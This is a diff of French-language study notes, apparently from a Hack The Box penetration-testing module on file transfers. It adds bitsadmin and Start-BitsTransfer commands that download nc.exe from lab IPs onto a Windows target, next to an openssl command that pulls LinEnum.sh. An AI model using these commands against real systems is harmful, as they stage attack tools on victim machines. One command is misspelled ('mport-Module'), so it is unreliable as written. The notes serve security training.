@@ -2,7 +2,7 @@
 title: File Transfers
 description: 
 published: true
-date: 2025-05-04T15:50:14.649Z
+date: 2025-05-04T15:53:12.759Z
 tags: notes, htb, module
 editor: markdown
 dateCreated: 2025-03-16T15:21:30.098Z
@@ -929,5 +929,22 @@ Télécharger le fichier:
 ```
 openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
 ```
+
+### Other Common Living off the Land tools
+
+D'autres binaires courants peuvent être utilisés, comme [BITS (Background Intelligent Transfer Service)](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal) pour télécharger des fichiers avec HTTP/S et SMB.
+
+Télécharger un fichier avec `bitsadmin`:
+
+```
+bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
+```
+
+Télécharger un fichier avec le module `bitstransfer` et la cmdlet `Start-BitsTransfer`:
+
+```
+mport-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
+```
+
 
 
